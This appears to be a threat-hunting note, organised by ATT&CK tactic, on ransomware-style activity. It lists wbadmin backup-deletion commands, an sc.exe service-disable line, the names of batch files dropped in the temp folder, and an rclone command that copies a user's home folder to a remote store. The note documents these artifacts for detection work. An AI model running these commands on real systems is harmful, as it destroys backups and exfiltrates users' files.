```markdown
## Tactic: Impact

### Technique: Inhibit System Recovery

Using the command-line utility `wbadmin` to delete and disable the backup.

#### Commands:

- **Create backup of F drive and backup on E drive:**
  ```bash
  wbadmin start backup -backupTarget:E: -include:F: -allCritical –quiet
  ```

- **Create backup of multiple folders:**
  ```bash
  wbadmin start backup –backupTarget:e: -include:c:\docs\,c:\backup –vsscopy
  ```

- **Create backup to shared network folder:**
  ```bash
  wbadmin start backup –backupTarget:\\srv1\backup -include:c:\docs\,c:\backup
  ```

- **Create auto backup on scheduled time:**
  ```bash
  wbadmin enable backup -include:c:\docs\* -addtarget:e: -allCritical -schedule:00:00
  ```

- **List available backups:**
  ```bash
  wbadmin get versions
  ```

- **Delete the backup:**
  ```bash
  wbadmin delete systemstatebackup
  ```

- **Delete the oldest backup copy:**
  ```bash
  wbadmin delete systemstatebackup –backupTarget:e: –deleteOldest -quiet
  ```

#### Process Chain:
```
Svchost.exe > cmd.exe > cmd.exe > wbadmin.exe, net.exe (Discovery Commands)
```

---

## Tactic: Impact, Persistence

### Technique: Service Stop, Windows Service

#### Commands:
- **Disable service using `sc.exe`:**
  ```bash
  sc.exe disable service
  ```

#### Temp folder files:
```
appdata/local/temp/*
3.bat
5.bat
Kasf.bat
```

---

## Tactic: Collection

### Technique: Local Data Staging

- **Remote file transfer tool `rclone` communicating:**
  ```bash
  C:\Users\jamesmurphy\AppData\Local\Temp\rclone.exe copy C:\Users\Jamesmurphy\ remote2:/home/cyborgbob/Documents/MegaTraining/FileCollection/Rclone/
  ```
```
